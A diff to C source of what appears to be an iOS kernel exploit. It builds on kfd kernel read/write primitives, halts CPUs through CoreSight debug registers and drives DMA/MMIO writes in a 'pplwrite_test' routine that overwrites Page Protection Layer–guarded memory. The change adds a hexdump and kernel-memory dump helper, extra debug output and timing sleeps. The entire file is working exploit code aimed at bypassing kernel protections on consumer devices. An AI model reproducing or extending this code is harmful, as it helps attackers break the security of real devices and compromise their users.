@@ -5,6 +5,7 @@
 //
 //
 
+#include <ctype.h>
 #include <unistd.h>
 #include <stdio.h>
 #include <sys/sysctl.h>
@@ -20,6 +21,9 @@
 
 #define DBGWRAP_DBGHALT          (1ULL << 31)
 #define DBGWRAP_DBGACK           (1ULL << 28)
+#ifndef HEXDUMP_COLS
+#define HEXDUMP_COLS 16
+#endif
 
 signed long long base_pac_mask = 0xffffff8000000000;
 
@@ -57,6 +61,59 @@ uint32_t sbox[] = {
      0x160, 0x290, 0x308, 0x3B0, 0x3C8, 0x3D0, 0x1A0, 0x260,
      0x310, 0x1C0, 0x2A0, 0x3E0, 0x2C0, 0x320, 0x340, 0x380
 };
+
+void hexdump(void *mem, unsigned int len) {
+        unsigned int i, j;
+        for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
+        {
+                /* print offset */
+                if(i % HEXDUMP_COLS == 0)
+                {
+                        printf("0x%06x: ", i);
+                }
+ 
+                /* print hex data */
+                if(i < len)
+                {
+                        printf("%02x ", 0xFF & ((char*)mem)[i]);
+                }
+                else /* end of block, just aligning for ASCII dump */
+                {
+                        printf("   ");
+                }
+                
+                /* print ASCII dump */
+                if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
+                {
+                        for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
+                        {
+                                if(j >= len) /* end of block, not really printing */
+                                {
+                                        putchar(' ');
+                                }
+                                else if(isprint(((char*)mem)[j])) /* printable char */
+                                {
+                                        putchar(0xFF & ((char*)mem)[j]);
+                                }
+                                else /* other char */
+                                {
+                                        putchar('.');
+                                }
+                        }
+                        putchar('\n');
+                }
+        }
+}
+
+void kreadump_kfd(uint64_t where, unsigned int len) {
+    int *buf = malloc(sizeof(int) * len);
+      for (int i = 0; i < len; i++) {
+          buf[i] = 0;
+      }
+    kreadbuf_kfd(where, buf, len);
+    hexdump(buf, len);
+    free(buf);
+}
 
 uint64_t kread64_ptr_kfd(uint64_t kaddr) {
     uint64_t ptr = kread64_kfd(kaddr);
@@ -148,14 +205,14 @@ void dma_ctrl_3(uint64_t ctrl,uint64_t value) {
 
 void dma_init(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
      dma_ctrl_1(base6140108);
-     dma_ctrl_2(base6140008,0);
-     dma_ctrl_3(base6140108,original_value_0x206140108);
+     dma_ctrl_2(base6140008, 0);
+     dma_ctrl_3(base6140108, original_value_0x206140108);
 }
 
 void dma_done(uint64_t base6140008, uint64_t base6140108, uint64_t original_value_0x206140108) {
      dma_ctrl_1(base6140108);
-     dma_ctrl_2(base6140008,1);
-     dma_ctrl_3(base6140108,original_value_0x206140108);
+     dma_ctrl_2(base6140008, 1);
+     dma_ctrl_3(base6140108, original_value_0x206140108);
 }
 
 void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
@@ -163,9 +220,10 @@ void ml_dbgwrap_halt_cpu(uint64_t coresight_base_utt) {
     printf("ml_dbgwrap_halt_cpu old value: %llx\n", dbgWrapReg);
     if ((dbgWrapReg & 0x90000000) != 0) return;
     write_qword(coresight_base_utt, dbgWrapReg | DBGWRAP_DBGHALT);// Clear all other writable bits besides dbgHalt; none of the power-down or reset bits must be set.
-    printf("ml_dbgwrap_halt_cpu  new value: %llx\n", *(uint64_t *)coresight_base_utt);
     while (1) {
+        sleep(1);
         if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) != 0) {
+            printf("ml_dbgwrap_halt_cpu new value: %llx\n", *(uint64_t *)coresight_base_utt);
             break;
         }
     }
@@ -176,9 +234,10 @@ void ml_dbgwrap_unhalt_cpu(uint64_t coresight_base_utt) {
     printf("ml_dbgwrap_unhalt_cpu curr value: %llx\n", dbgWrapReg);
     dbgWrapReg = (dbgWrapReg & 0xFFFFFFFF2FFFFFFF) | 0x40000000;
     write_qword(coresight_base_utt, dbgWrapReg);
-    printf("ml_dbgwrap_unhalt_cpu  back value: %llx\n", *(uint64_t *)coresight_base_utt);
     while (1) {
+        sleep(1);
         if ((read_qword(coresight_base_utt) & DBGWRAP_DBGACK) == 0) {
+            printf("ml_dbgwrap_unhalt_cpu back value: %llx\n", *(uint64_t *)coresight_base_utt);
             break;
         }
     }
@@ -208,11 +267,8 @@ uint64_t ipc_entry_lookup(mach_port_name_t port_name) {
     uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
     uint64_t object_pac = kread64_kfd(entry + off_ipc_entry_ie_object);
     uint64_t object = object_pac | 0xffffff8000000000;
-    printf("object: 0x%llx\n", object);
-    
     uint64_t kobject_pac = kread64_kfd(object + off_ipc_port_ip_kobject);
     uint64_t kobject = kobject_pac | 0xffffff8000000000;
-    printf("ip_kobject: 0x%llx\n", kobject);
     
     return kobject;
 }
@@ -226,7 +282,7 @@ uint64_t IO_GetMMAP(uint64_t phys, uint64_t size)
     uint64_t desc = kread64_kfd(surface + 0x38);
     uint64_t ranges = kread64_kfd(desc + 0x60);
     kwrite64_kfd(ranges, phys);
-    kwrite64_kfd(ranges+8, size);
+    kwrite64_kfd(ranges + 8, size);
     kwrite64_kfd(desc + 0x50, size);
     kwrite64_kfd(desc + 0x70, 0);
     kwrite64_kfd(desc + 0x18, 0);
@@ -373,10 +429,15 @@ void pplwrite_test(void) {
         write_data_with_mmio(test_p, base6150000, mask, i, 0x4141414141414141);
         
         dma_done(base6140008, base6140108, original_value_0x206140108);
+        
+        printf("we are here\n");
+        usleep(5000);
+        
         ml_dbgwrap_unhalt_cpu(base6040000);
         
         if (isa15a16) write_qword(base6150020, base6150020_back);
-        uint64_t test= kread64_kfd(test_p);
+        uint64_t test = kread64_kfd(test_p);
         printf("%llx  : %llx\n", test_p, test);
+        kreadump_kfd(test_p, 0x10);
     });
 }
